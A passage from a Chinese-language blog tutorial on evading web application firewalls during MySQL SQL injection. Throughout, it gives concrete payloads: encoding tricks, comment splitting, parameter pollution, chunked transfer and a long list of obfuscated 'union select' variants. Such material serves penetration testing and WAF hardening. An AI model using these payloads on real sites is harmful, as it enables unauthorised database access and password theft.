class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">1</span>A,<span class="hljs-number">1</span>B,<span class="hljs-number">1</span>C,<span class="hljs-number">1</span>D,<span class="hljs-number">1</span>E,<span class="hljs-number">1</span>F,<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="浮点数绕过"><a href="#浮点数绕过" class="headerlink" title="浮点数绕过"></a>浮点数绕过</h3><p>如果注入点是整型，那么将其改为浮点数也能绕过部分waf，如将8改为8E0或8.0</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>将字母改为大小写混合的形式，如</p><blockquote><p>select * from users where id&#x3D;1 UnIon SelEct 1,2,3–+</p></blockquote><h3 id="NULL值绕过"><a href="#NULL值绕过" class="headerlink" title="NULL值绕过"></a>NULL值绕过</h3><p>在mysql中“\N”代表null</p><p><img src="/image-20220318201947600.png" alt="image-20220318201947600"></p><blockquote><p>select * from users where id&#x3D;\Nunion select 1,2,\N</p></blockquote><p><img src="/image-20220318202328396.png" alt="image-20220318202328396"></p><p>注意：\N后面的空格可加可不加，语法上都可行，不加可以绕过部分waf</p><h3 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h3><p>如果waf过滤了单引号、双引号，那么可以将值转为十六进制再进行查询，如’admin’的十六进制为’61646D696E’，那么我们直接把’admin’替换为0x61646D696E就好，整个payload就不需要引号了。需要注意的是只有注入点是整型才可以，如果注入点是字符型则没法闭合引号，会导致语句报错。</p><p><img src="/image-20220319121831699.png" alt="image-20220319121831699"></p><blockquote><p>select * from users where id&#x3D;-1 union select 1,2,(select password from users where username&#x3D;’admin’)–+</p></blockquote><blockquote><p>select * from users where id&#x3D;-1 union select 1,2,(select password from users where username&#x3D;0x61646D696E)–+</p></blockquote><h3 id="添加库名表名-跨库查询"><a href="#添加库名表名-跨库查询" class="headerlink" title="添加库名表名&amp;&amp;跨库查询"></a>添加库名表名&amp;&amp;跨库查询</h3><blockquote><p>select password from users</p></blockquote><blockquote><p>select users.password from security.users</p></blockquote><p>假设我们要查询的数据库为security，表为users，以上两条语句的查询结果是一样的。下面加了库名表名的语句就可以绕过部分waf</p><h3 id="打破常见关键字组合绕过"><a href="#打破常见关键字组合绕过" class="headerlink" title="打破常见关键字组合绕过"></a>打破常见关键字组合绕过</h3><p>“union select”这两个关键字在查询时通常都会连在一起使用，waf规则编写者在带有这种惯性思维编写规则时，会将带有这一整个组合的字符串一起过滤，这也会给我们可乘之机。比如在这两个关键字中再加上一个关键字，但不改变语句的查询结果，有这种关键字吗？有，比如“distinct”去重复关键字，“all”查询全部，以及“distinct”的同义词“distinctrow”。或者直接在这之间加入换行符或者注释</p><blockquote><p>-1’ union distinct select password from users–+</p><p>-1’ union all select password from users–+</p><p>-1’ union%0a&#x2F;*任意字符。。。*&#x2F;select password from users–+</p></blockquote><h3 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h3><p>查询语句在表名上，可以加上反引号，也可以不加反引号，都能正常执行。有时候加上反引号可以绕过</p><blockquote><p>-1’ union select password from `users`–+</p></blockquote><h3 id="脚本语言特性绕过"><a href="#脚本语言特性绕过" class="headerlink" title="脚本语言特性绕过"></a>脚本语言特性绕过</h3><p>PHP中同一个变量最后出现的值会覆盖前面的赋值，比如</p><blockquote><p>id&#x3D;1&amp;id&#x3D;2</p></blockquote><p>此时在php中id取值为2，我们可以利用这个特性来绕过waf，需要注意的是不同的脚本语言配合不同的中间件有不同的特性</p><blockquote><p>id&#x3D;1%00&amp;id&#x3D;2 union select 1,2,3– </p></blockquote><p>%00是截断字符，有的waf匹配到第一个%00时，会终止匹配，从而让后面的语句进入执行，最终php处理的语句为<code>id=2 union select 1,2,3-- </code>从而造成了注入。</p><p>其他语言特性</p><p><img src="/image-20220321102648180.png" alt="image-20220321102648180"></p><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><p>在常规的显式注入中，我们会用union select来让想要的信息直接显示在页面上。但有些waf会过滤逗号，所以我们需要找一种不需要逗号的注入方式。对于显式查询和盲注有不同的绕过绕过方式，join连接可以用于显式注入，而substr、mid、like这类字符对比类的方法可以用于盲注的场景。</p><h4 id="join连接"><a href="#join连接" class="headerlink" title="join连接"></a>join连接</h4><p>先说存在显式注入的情况。在常规的显式注入时，我们会用联合查询也就是union select来把数据显示在页面上</p><blockquote><p>id&#x3D;1 union select 1,database(),user()– </p></blockquote><p>问题是这会有逗号，用join就可以在没有逗号的情况下使用联合查询显式爆数据。用下面的语句可以达到和上面语句一样的效果</p><blockquote><p>id&#x3D;1 union select (select 1)a join (select database())b join (select user())c</p></blockquote><p><img src="/image-20220321124005981.png" alt="image-20220321124005981"></p><p>这里我们让id&#x3D;-1确保没有对应的信息，这样才能显示后面我们想要的数据。前面的users表有三个字段，所以这里联合查询的时候第一个字段显示1，第二，三个字段分别显示当前的数据库名和用户名。另外就是由于join连接后是表，所以在union select后是从联合表中查询信息，不能像之前那样直接<code>union select 1,2,database()</code>来获取信息。</p><h4 id="substr截取字符"><a href="#substr截取字符" class="headerlink" title="substr截取字符"></a>substr截取字符</h4><p>在常规的盲注中获取当前使用的数据库名，我们会用以下语句来对比数据库的第一位字符</p><blockquote><p>id&#x3D;1 and ‘s’&#x3D;(select(substr(database(),1,1)))– </p></blockquote><p><img src="/image-20220321112852964.png" alt="image-20220321112852964"></p><p>我们来关注一下语句的后半段，substr这个函数的第一个参数是需要截取的字符，这个不用多说。第二个参数是从第几位开始截取，第三个参数是截取的步长，也就是截取几位字符。也可以写作<code>substr(database() from 1 for 1)</code>这种形式，从而把逗号去除。再看前面的’s’可以用十六进制来表示，字母s对应的十六进制为0x73，所以上面的语句可以变为</p><p><img src="/image-20220321113509192.png" alt="image-20220321113509192"></p><blockquote><p>id&#x3D;1 and 0x73&#x3D;(select(substr(database()from 1 for 1)))– </p></blockquote><h4 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h4><p>除了substr这个函数可以用来截取字符串绕过逗号，也可以使用mid来代替substr，用法完全相同，原理同上。</p><blockquote><p> id&#x3D;1 and 0x73&#x3D;(select(mid(database()from 1 for 1)))– </p></blockquote><h4 id="like模糊查询"><a href="#like模糊查询" class="headerlink" title="like模糊查询"></a>like模糊查询</h4><p>用like模糊查询也是一种用于盲注的字符对比类的注入方式，模糊查询匹配成功返回1，否则返回0。我们可以一个字符一个字符来遍历得到结果。这种方式也不需要逗号。</p><p><img src="/image-20220321154245371.png" alt="image-20220321154245371"></p><h4 id="limit-offset绕过"><a href="#limit-offset绕过" class="headerlink" title="limit offset绕过"></a>limit offset绕过</h4><p>在遍历数据时，我们会用limit去选取哪一行或者哪几行的数据。limit如果只给一个参数时代表rows，即需要的行数。如果给了两个参数，那么第一个参数代表offset，即从第几行开始选取，第二个参数代表rows。下面的语句表示从2开始选取一条数据</p><blockquote><p>select * from users limit 2,1;</p></blockquote><p>如果waf过滤了逗号，也可以写作<code>limit [rows] offset [offset]</code>的形式</p><blockquote><p>select * from users limit 1 offset 2;</p></blockquote><p><img src="/image-20220321180620271.png" alt="image-20220321180620271"></p><h3 id="运算符绕过"><a href="#运算符绕过" class="headerlink" title="运算符绕过"></a>运算符绕过</h3><p>这四个关键字是手工注入中判断是否存在注入点最常用的方式，主流waf都会对<code>id=1 and 1=1</code>类似这些语句做拦截。其实这四个关键字可以用逻辑运算符号来替代</p><table><thead><tr><th>逻辑运算符</th><th>对应符号</th><th>使用形式</th></tr></thead><tbody><tr><td>and</td><td>&amp;&amp;</td><td>id&#x3D;1 &amp;&amp; 1&#x3D;1</td></tr><tr><td>or</td><td>||</td><td>id&#x3D;1 || 1&#x3D;1</td></tr><tr><td>not</td><td>!</td><td>id&#x3D;1 &amp;&amp; 1&#x3D;(!(!1))</td></tr><tr><td>xor</td><td>^</td><td>id&#x3D;1 &amp;&amp; 1^1</td></tr></tbody></table><p>关于not还有一种姿势，<code>(-1 not in (1))</code>这个语句恒等于1，而<code>(-1 not in (-1))</code>这个语句恒等于0，所以我们也可以用这个来代替前面的<code>1=1</code>的判断</p><blockquote><p>select * from users where id&#x3D;-1 not in (1)</p><p>select * from users where id&#x3D;-1 not in (-1)</p></blockquote><p>还有以下6种位运算符</p><table><thead><tr><th>位运算符</th><th>说明</th><th>使用形式</th></tr></thead><tbody><tr><td>|</td><td>位或</td><td>a|b</td></tr><tr><td>&amp;</td><td>位与</td><td>a&amp;b</td></tr><tr><td>^</td><td>位异或</td><td>a^b</td></tr><tr><td>~</td><td>位取反</td><td>~a</td></tr><tr><td>&lt;&lt;</td><td>位左移</td><td>a&lt;&lt;b</td></tr><tr><td>&gt;&gt;</td><td>位右移</td><td>a&gt;&gt;b</td></tr></tbody></table><p>也可以用运算符来对手工注入的语句做一些变换</p><blockquote><p>id&#x3D;1 &amp;&amp; 2&#x3D;1+1</p></blockquote><h3 id="ascii字符对比绕过"><a href="#ascii字符对比绕过" class="headerlink" title="ascii字符对比绕过"></a>ascii字符对比绕过</h3><p>有些waf对union select拦截的话，我们就没办法使用显式注入了。不过可以用盲注中的字符对比法来爆数据。</p><blockquote><p>select * from users where id&#x3D;1 and substr(database(),1,1)&#x3D;’s’</p><p>select * from users where id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;115</p></blockquote><p>在做判断时也可以构造恒成立的语句，比如字母s的ascii就是115，这也是一种<code>1=1</code>的变体</p><blockquote><p>select * from users where id&#x3D;1 and ascii(substr(‘s’,1,1))&#x3D;115</p></blockquote><h3 id="等号绕过"><a href="#等号绕过" class="headerlink" title="等号绕过"></a>等号绕过</h3><p>如果waf对等号&#x3D;拦截，可以用大于号&gt;、小于号&lt;、like、rlike模糊查询以及正则查询regexp来绕过</p><blockquote><p>select * from users where id&#x3D;1 and ascii(substr(database(),1,1))&gt;114</p></blockquote><p>值得一提的是，用等号跑数据需要遍历每个字母，但用大于号和小于号可以用二分法查询，从而减少查询次数，加快查询速度</p><blockquote><p>select * from users where id&#x3D;1 and substr(database(),1,1)like ‘s%’</p></blockquote><p><img src="/image-20220322154113759.png" alt="image-20220322154113759"></p><p>顺便说一下like和rlike的区别，like就是模糊查询。rlike是REGEXP_LIKE()的同义词，也是regexp的同义词。根据正则来匹配。另外他们都不区分大小写。</p><p><img src="/image-20220322155642689.png" alt="image-20220322155642689"></p><blockquote><p>select * from users where id&#x3D;1 and substr(database(),1,1) regexp ‘^s’;</p></blockquote><p><img src="/image-20220322154315774.png" alt="image-20220322154315774"></p><p>等号也可以用in和between来代替：</p><p><img src="/image-20220329195245538.png" alt="image-20220329195245538"></p><p><img src="/image-20220329195509246.png" alt="image-20220329195509246"></p><h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>有的防御脚本对特定关键字只过滤一次，如union、select等，那我们就可以双写关键字，使过滤一次以后的语句能正常执行</p><blockquote><p>id&#x3D;1 u<strong>union</strong>nion sele<strong>select</strong>ct 1,2,3– </p></blockquote><p>该语句被过滤一次关键字后（粗体）就变成了正常的注入语句，从而绕过了防御脚本</p><blockquote><p>id&#x3D;1 union select 1,2,3– </p></blockquote><h3 id="多参数拆分绕过"><a href="#多参数拆分绕过" class="headerlink" title="多参数拆分绕过"></a>多参数拆分绕过</h3><p>首先来看一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where id=&#x27;<span class="hljs-subst">$id</span>&#x27; and username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查询的语句是：&quot;</span>.<span class="hljs-variable">$sql</span>;<br></code></pre></td></tr></table></figure><p>有两个参数被拼接在了同一条sql查询语句中，假设waf会对每个提交上来的参数拦截其中的“union select”，该如何绕过？此时可以将“union select”拆分在不同的参数中，payload如下</p><blockquote><p>1’ union&#x2F;*&amp;username&#x3D;admin*&#x2F;select 1,2,3–+</p></blockquote><p><img src="/image-20220323184949603.png" alt="image-20220323184949603"></p><p>可以看到username这个参数的直接被注释掉，为了看的更清晰，去除注释后的语句就变成了</p><blockquote><p>select * from users where id&#x3D;’1’ union select 1,2,3– </p></blockquote><p>就变成了一个非常普通的union select注入。小总结一下多参数拆分注入的要点是：<strong>同一条sql查询语句中存在两个或以上的可控参数</strong></p><h3 id="生僻函数绕过"><a href="#生僻函数绕过" class="headerlink" title="生僻函数绕过"></a>生僻函数绕过</h3><p>updatexml()函数经常用于报错注入中，所以waf也会对这个函数进行拦截。我们可以在mysql文档中寻找一些生僻的函数，来达到同样的效果，比如polygon()</p><blockquote><p>select polygon((select * from (select * from (select @@version) f) x));</p></blockquote><p><img src="/image-20220323185840131.png" alt="image-20220323185840131"></p><p>还有其他的一些等价函数，如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">hex</span><span class="hljs-params">()</span></span>、<span class="hljs-built_in">bin</span>() ==&gt; <span class="hljs-built_in">ascii</span>()<br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">()</span></span> ==&gt;<span class="hljs-built_in">benchmark</span>() <br><span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span></span>==&gt;<span class="hljs-built_in">group_concat</span>() <br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">()</span></span>、<span class="hljs-built_in">substr</span>() ==&gt; <span class="hljs-built_in">substring</span>()<br>@@user ==&gt; <span class="hljs-built_in">user</span>() <br>@@datadir ==&gt; <span class="hljs-built_in">datadir</span>()<br></code></pre></td></tr></table></figure><h3 id="信任白名单"><a href="#信任白名单" class="headerlink" title="信任白名单"></a>信任白名单</h3><p>像phpmyadmin这些web端的mysql管理软件，会有大量的sql语句拼接在url中。有些waf本意是为了防止对这些管理软件的url拦截而自带文件白名单，如果请求的是白名单中的文件名，sql语句就直接放行。</p><p>白名单通常有：<code>/admin</code>，<code>/phpmyadmin</code>，<code>/admin.php</code></p><p>可以随便赋值给一个参数就行，只要包含在url就可以</p><blockquote><p><a href="http://localhost/sqli.php?aaa=/phpmyadmin&id=-1">http://localhost/sqli.php?aaa=/phpmyadmin&amp;id=-1</a>‘ and 1&#x3D;1–+</p></blockquote><h3 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h3><p>出了白名单文件目录绕过外， 有些waf也不会对静态文件后的参数做检查，静态文件如图片jpg，png，gif，svg，样式文件css，脚本文件js，字体文件woff，ttf，利用方式也是加在url当中即可</p><blockquote><p><a href="http://localhost/sqli.php?aaa=/1.css&id=-1">http://localhost/sqli.php?aaa=/1.css&amp;id=-1</a>‘ and 1&#x3D;1–+</p><p><a href="http://localhost/sqli.php?/1.jpg&id=-1">http://localhost/sqli.php?/1.jpg&amp;id=-1</a>‘ and 1&#x3D;1–+</p></blockquote><h3 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h3><p>order by常用于手工注入时判断表中字段的个数，order by被拦截时可以用@符号绕过，@在mysql中是取变量的含义</p><blockquote><p>select * from users where id&#x3D;1 union select @a,@b,@c–+</p></blockquote><p>可以看到如果变量个数与字段数不相等则会报错</p><p><img src="/image-20220324184545037.png" alt="image-20220324184545037"></p><p>再简单些也可以不输变量名，只用@符号，并且不用union select联合查询，用into赋值语句</p><p><img src="/image-20220324184701002.png" alt="image-20220324184701002"></p><p><img src="/image-20220324184931517.png" alt="image-20220324184931517"></p><h3 id="改变请求方式绕过"><a href="#改变请求方式绕过" class="headerlink" title="改变请求方式绕过"></a>改变请求方式绕过</h3><p>所谓的改变请求方式就是原本是get请求，可以变成用post去请求；原本是post的请求可以变成用get去请求。有几率绕过waf。具体原理我们先举个例子，首先我们都知道，如果是post请求，服务器会从请求体body中取参，而如果是get请求，服务器会从url中取参。所以waf在接收到post请求时会检测请求体body里的参数，接收到get请求时会检测url中的参数。假设服务端要用get方式接受一个id参数，那么服务端的语句一定是<code>$id=$_GET[&#39;id&#39;];</code>。那么如果我们用post给这个接口发起请求，waf检测到这是个post请求就会去检测请求体中的参数，但实际上服务端脚本接受到的是url中的参数，我们就可以在url中的参数中sql注入。</p><p><img src="/image-20220325121946047.png" alt="image-20220325121946047"></p><p>右下角是服务器的代码，接受一个get请求的id参数。我们用post请求服务器照样可以正常接收到get参数，但waf可能就会认为这是个post请求从而去检查post请求体中的参数，造成了绕过。在实际应用中也可以试试put等请求方式</p><h3 id="application-json-或-text-xml-绕过"><a href="#application-json-或-text-xml-绕过" class="headerlink" title="application&#x2F;json 或 text&#x2F;xml 绕过"></a>application&#x2F;json 或 text&#x2F;xml 绕过</h3><p>有些waf对于json或xml中的数据不会做检查，从而造成了绕过。注意请求头中的<code>Content-Type</code>要设置为application&#x2F;json或text&#x2F;xml，并且后端程序支持接受这类形式的传参。</p><h3 id="脏数据溢出绕过"><a href="#脏数据溢出绕过" class="headerlink" title="脏数据溢出绕过"></a>脏数据溢出绕过</h3><p>在真正的payload前填入大量的脏数据，数据太多超过了waf的检测范围。真正的原理据说是因为这算是一个缓冲区溢出。很多waf是C语言编写的，而C语言本身没有缓冲区保护机制。waf在检测超过其缓冲区长度的payload时就会造成绕过。</p><blockquote><p>id&#x3D;1’ and (select 1)&#x3D;(select 0xA*1000) union select 1,2database()–+</p></blockquote><p>这里的<code>select 0xA*1000</code>指的是对0xA的A重复1000次。</p><h3 id="花括号绕过"><a href="#花括号绕过" class="headerlink" title="花括号绕过"></a>花括号绕过</h3><p>在值的位置加上花括号，左边x的位置上可以输入任意字母开头+数字的组合</p><p><img src="/image-20220329173607017.png" alt="image-20220329173607017"></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>利用编码绕过waf的最基本的原理就是waf识别不了请求包中的编码协议，或者说对请求包中的编码处理能力有限，但服务器却可以正确识别并处理</p><h4 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h4><p>一开始会把二次编码注入和二次注入搞混淆，关于二次注入会新开一篇文章讲讲。这里先说二次编码注入绕过waf。首先我们先来看一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 首先是一段转义代码，gpc开启时直接用gpc转义，没开启就用addslashes()转义</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterstr</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())&#123;<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-comment">// 经过url解码后送入sql语句中执行</span><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filterstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM usres WHERE id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查询的语句是：&quot;</span>.<span class="hljs-variable">$sql</span>;<br><span class="hljs-comment">// $result = mysql_query($sql);</span><br><span class="hljs-comment">// $row = mysql_fetch_array($result);</span><br></code></pre></td></tr></table></figure><p>乍一看sql语句是经过转义过的，直接执行应该没什么问题。但是我们注意到这个urldecode()函数。这里借用一张图来解释说明。浏览器在传输get方式提交的参数时，会将参数url编码一次，nginx、apache之类的中间件会将参数解码一次。但是如果浏览器传入的是二次url编码后的数据，waf检测到的是只经过一次url解码后的数据，自然就认为是正常的数据了。</p><p><img src="/8581772-82bf1ed3b14f8a26.png" alt="img"></p><p>这里用burp做两次url编码</p><p><img src="/image-20220323161250379.png" alt="image-20220323161250379"></p><p>一次编码的查询结果，可以看到单引号是被正常转义的</p><p><img src="/image-20220323161309576.png" alt="image-20220323161309576"></p><p>两次编码的查询结果，可以看到二次编码后单引号反而没有被转义，直接可以注入了</p><p><img src="/image-20220323161335933.png" alt="image-20220323161335933"></p><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><p>可以将整个payload做一次url编码，也可以对其中单独的字符做url编码，如N的url编码是%4e，在payload中直接用%4e代替，服务器会自动解码后去查询。</p><p><img src="/image-20220329180531823.png" alt="image-20220329180531823"></p><h4 id="ibm037编码"><a href="#ibm037编码" class="headerlink" title="ibm037编码"></a>ibm037编码</h4><p>我们需要在Content-Type上设置编码为ibm037，</p><blockquote><p>Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;ibm037</p></blockquote><p>并且将请求体用ibm037编码。这里放一段ibm037的编码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>s = <span class="hljs-string">&#x27;id=-1 union select 1,user()-- &#x27;</span><br>ens=urllib.parse.quote(s.encode(<span class="hljs-string">&#x27;ibm037&#x27;</span>))<br><span class="hljs-built_in">print</span>(ens)<br></code></pre></td></tr></table></figure><p><img src="/image-20220329183157363.png" alt="image-20220329183157363"></p><p>ibm037的支持情况可以参考以下表格</p><p><img src="/image-20220329182757261.png" alt="image-20220329182757261"></p><h4 id="unicode编码绕过"><a href="#unicode编码绕过" class="headerlink" title="unicode编码绕过"></a>unicode编码绕过</h4><p>unicode形式：“\u”或者“%u”加上4位16进制unicode码值</p><p>iis会自动识别这种编码，有些waf不会拦截这种编码</p><p>和url编码一样，可以部分编码，也可以全编码</p><p>部分编码，大写N的unicode编码为\u004e，小写s的unicode编码为\u0073，所以payload为</p><blockquote><p>id&#x3D;-1 u\u004eion \u0073elect 1,2,database()– </p></blockquote><p>全编码：</p><blockquote><p>id&#x3D;-1 union select 1,2,database()– </p><p>\u0069\u0064\u003d\u002d\u0031\u0020\u0075\u006e\u0069\u006f\u006e\u0020\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u0031\u002c\u0032\u002c\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u002d\u002d\u0020</p></blockquote><p>如果请求包为JSON格式，也可以将payloadu全部或部分转为unicode编码来绕过waf，参考<a href="https://datatracker.ietf.org/doc/html/rfc7159#section-8.2">JSON RFC</a></p><h3 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a>union select绕过</h3><p>waf 会针对union select 进行拦截</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">uNIoN sel&lt;&gt;ect <span class="hljs-comment"># 程序过滤&lt;&gt;为空 脚本处理</span><br>uNi<span class="hljs-regexp">/**/</span>on sele<span class="hljs-regexp">/**/</span>ct <span class="hljs-comment"># 程序过滤/**/为空</span><br>uNIoN <span class="hljs-regexp">/\*!%53eLEct\*/</span> <span class="hljs-comment"># url 编码与内联注释</span><br>uNIoN se%<span class="hljs-number">0</span>blect <span class="hljs-comment"># 使用空格绕过</span><br>uNIoN sele%ct <span class="hljs-comment"># 使用百分号绕过</span><br>uNIoN %<span class="hljs-number">53</span>eLEct <span class="hljs-comment"># 编码绕过</span><br>uNIoN sELecT <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#大小写绕过</span><br>uNIoN all select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># ALL绕过</span><br>uNIoN DISTINCT select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 去重复DISTINCT 绕过</span><br>null+UNION+SELECT+<span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 加号代替空格绕过</span><br><span class="hljs-regexp">/\*!union\*/</span><span class="hljs-regexp">/\*!select\*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 内联注释绕过</span><br><span class="hljs-regexp">/\*!50000union\*/</span><span class="hljs-regexp">/\*!50000select\*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 内联注释绕过</span><br>uNIoN<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 注释代替空格绕过</span><br><span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!12345UNION SELECT*/</span><span class="hljs-regexp">/**/</span><br><span class="hljs-regexp">/**/</span>UNION<span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!50000SELECT*/</span><span class="hljs-regexp">/**/</span><br>REVERSE(noinu)+REVERSE(tceles)<br><span class="hljs-regexp">/*!%55NiOn*/</span> <span class="hljs-regexp">/*!%53eLEct*/</span><br>%<span class="hljs-number">55</span>nion(%<span class="hljs-number">53</span>elect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)-- -<br>+union+distinct+select+<br>+<span class="hljs-comment">#uNiOn+#sEleCt</span><br>+<span class="hljs-comment">#1q%0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="hljs-regexp">/*!%55NiOn*/</span> <span class="hljs-regexp">/*!%53eLEct*/</span><br><span class="hljs-regexp">/*--*/u</span>nion<span class="hljs-regexp">/*--*/</span>select<span class="hljs-regexp">/*--*/</span><br>union (<span class="hljs-regexp">/*!/</span>**<span class="hljs-regexp">/ SeleCT */</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!union*/</span><span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!select*/</span><span class="hljs-regexp">/**/</span><br>union%<span class="hljs-number">23</span>foo*%<span class="hljs-number">2</span>F*bar%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aselect%<span class="hljs-number">23</span>foo%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br>%<span class="hljs-number">2</span>f**%<span class="hljs-number">2</span>funion%<span class="hljs-number">2</span>f**%<span class="hljs-number">2</span>fselect<br></code></pre></td></tr></table></figure><h3 id="其他畸形payload（持续新增）"><a href="#其他畸形payload（持续新增）" class="headerlink" title="其他畸形payload（持续新增）"></a>其他畸形payload（持续新增）</h3><blockquote><p>union select””a1,database(),3</p><p>union select+1,database(),3</p><p>换行+注释绕过关键表名检测，如<code>information_schema.tables</code>：</p><p>information_schema%23%0a.%23%0a.tables</p></blockquote><h3 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h3><p>分块传输本意用于post的数据过大，需要分成好几个chunk来传输。我们可以利用这个特性来分割payload，从而绕过部分waf。在请求的header中加入<code>Transfer-Encoding: chunked</code>之后，就代表这个报文采用了分块编码。每个分块的首行为数据的长度值（十六进制），可以在长度标识处加上分号“;”作为注释。第二行为数据行，将原payload分为若干个分块，在最后一块数据后加上一个0和两个换行符也就是CRLF，表示后面没有其他数据了。</p><p><img src="/image-20220401160737081.png" alt="分块传输绕过"></p><p>新增：最近看到c0ny1师傅提出了一种延时分块传输绕过waf的姿势，学习了<a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></p><h3 id="Pipeline绕过"><a href="#Pipeline绕过" class="headerlink" title="Pipeline绕过"></a>Pipeline绕过</h3><p>在http中使用pipeline是为了复用TCP连接从而加速数据传输速度、降低延迟。在http1. 